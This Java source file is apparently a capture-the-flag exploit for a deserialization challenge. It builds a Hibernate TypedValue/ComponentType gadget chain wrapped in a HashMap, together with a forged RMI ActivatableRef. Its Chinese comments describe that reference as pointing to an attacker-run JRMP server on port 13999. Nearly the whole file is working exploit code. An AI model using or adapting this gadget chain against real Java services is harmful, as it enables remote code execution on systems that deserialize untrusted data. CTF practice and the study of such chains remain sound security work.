package exp;

import exp.tools.ReflectTools;
import exp.tools.UnsafeTools;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import sun.rmi.server.ActivatableRef;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.rmi.activation.ActivationID;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Base64;
import java.util.HashMap;
import java.util.Random;

public class Exp {
    public static void main(String[] args) throws Exception {
        String s1 = "n1ght";
        String s2 = "mPght";
        Object payload = getPayload();
//        byte[] bytes = ReflectTools.ser2bytes(payload);
//        String s = Base64.getEncoder().encodeToString(bytes);
//        FileOutputStream fileOutputStream = new FileOutputStream("D:\\BaiduSyncdisk\\ctf-challenges\\1diot9\\Solutions\\Pycharm\\2025\\ISCTF\\Regretful_Deser\\base64.txt");
//        fileOutputStream.write(s.getBytes());
    }

    public static Object getPayload() throws Exception {
        ActivatableRef activatableRef = (ActivatableRef) getActivatableRef("127.0.0.1", 13999);
        
        // 获取 getRef 方法并设置为可访问
        java.lang.reflect.Method getRefMethod = activatableRef.getClass().getDeclaredMethod("getRef");
        getRefMethod.setAccessible(true);
        
        GetterMethodImpl getterMethod = new GetterMethodImpl(ActivatableRef.class, "ref", getRefMethod);
        PojoComponentTuplizer o = (PojoComponentTuplizer) UnsafeTools.getObjectByUnsafe(PojoComponentTuplizer.class);
        ReflectTools.setFieldValue(o, "getters", new Getter[]{getterMethod});
        ComponentType o1 = (ComponentType) UnsafeTools.getObjectByUnsafe(ComponentType.class);
        ReflectTools.setFieldValue(o1, "componentTuplizer", o);
        ReflectTools.setFieldValue(o1, "propertySpan", 1);
        TypedValue typedValue = new TypedValue(o1, activatableRef);

        typedValue.hashCode();

        HashMap<Object, Object> hashMap = ReflectTools.makeMap(typedValue, typedValue);
        return hashMap;
    }

    public static Object getActivatableRef(String host, int port) throws Exception {
        // 1. 构造底层的 UnicastRef，指向恶意的 JRMP 服务 (例如 ysoserial 的 JRMPListener)
        // 这里端口 13999 是攻击者的 JRMP Server
        ObjID activatorObjId = new ObjID(ObjID.ACTIVATOR_ID); // 伪装成系统 Activator ID (1)
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef originalRef = new UnicastRef(new LiveRef(activatorObjId, te, false));

        // 2. 创建一个 Activator 类型的动态代理
        // 也就是构造你上一题中提到的 activator.activate() 的那个 "activator" 对象
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(originalRef);
        Activator activatorProxy = (Activator) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(),
                new Class[]{Activator.class},
                handler
        );

        // 3. 构造 ActivationID
        // ActivationID 的构造函数是 protected 的，需要通过反射调用
        // 构造函数签名: ActivationID(Activator activator)
        Constructor<ActivationID> activationIDConstructor = ActivationID.class.getDeclaredConstructor(Activator.class);
        activationIDConstructor.setAccessible(true);
        ActivationID activationID = activationIDConstructor.newInstance(activatorProxy);

        // 4. 构造 ActivatableRef
        // 这是封装 ActivationID 的关键 Ref
        // 构造函数签名: ActivatableRef(ActivationID id, RemoteRef ref)
        Class<?> activatableRefClass = Class.forName("sun.rmi.server.ActivatableRef");
        Constructor<?> activatableRefConstructor = activatableRefClass.getDeclaredConstructor(ActivationID.class, RemoteRef.class);
        activatableRefConstructor.setAccessible(true);
        // 第二个参数可以为 null，或者传入 originalRef 作为 fallback
        Object activatableRef = activatableRefConstructor.newInstance(activationID, null);

        return activatableRef;
    }
}
